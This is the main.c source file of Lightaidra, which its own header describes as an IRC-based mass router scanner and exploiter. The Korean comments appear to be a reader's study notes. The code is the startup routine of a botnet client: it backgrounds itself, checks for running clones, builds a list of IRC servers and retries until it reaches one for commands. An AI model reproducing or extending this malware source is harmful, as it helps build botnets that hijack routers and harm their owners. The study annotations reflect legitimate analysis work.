// UTF-8 인코딩

/*
 * main.c - USE LIGHTAIDRA AT YOUR OWN RISK!
 *
 * Lightaidra - IRC-based mass router scanner/exploiter.
 * Copyright (C) 2008-2015 Federico Fazzi, <eurialo@deftcode.ninja>.
 *
 * LEGAL DISCLAIMER: It is the end user's responsibility to obey 
 * all applicable local, state and federal laws. Developers assume 
 * no liability and are not responsible for any misuse or damage 
 * caused by this program.
 *
 */

#include "../include/headers.h"

void daemonize();					// from utils.c
void create_irc_servlist();			// from utils,c
int connect_to_irc(sock_t * sp);	// from irc.c

int main(int argc, char **argv) {
    sock_t *sp;

    if (!background_mode) daemonize();

    pidprocess();

    for (counter = 0; counter <= 10; counter++) isrv[counter] = (char *)malloc(32);
    
    counter = 0;
    create_irc_servlist();

retry:

    sleep(2);
    sp = (sock_t *) malloc(sizeof(sock_t));

    if (connect_to_irc(sp)) {
        if (background_mode) printf("!Lightaidra: connection failed to %s!", isrv[counter]);

        if (counter <= total) counter++;
        else counter = 0;

        free(sp);
        goto retry;
    }

    return EXIT_SUCCESS;
}

/*
 * Aidra가 백그라운드에서 실행중이지 않다면, 백그라운드에서 실행시킨다.
 * pidprocess() 에서는 파일의 권한을 확인하고 그 파일이 존재한다면
 * 프로세스 넘버를 확인해서 삭제하고(클론체크), 프로세스를 생성한다.
 * isrv 메모리 공간을 10개 할당하고 conter를 0으로 만듬.
 * 그 후 create_irc_servlist() 실행. 
 * 
 * irc연결이 실패했다면 실패 메세지를 출력하고, 성공할때까지 루프를 돌면서 연결을 반복한다.
 */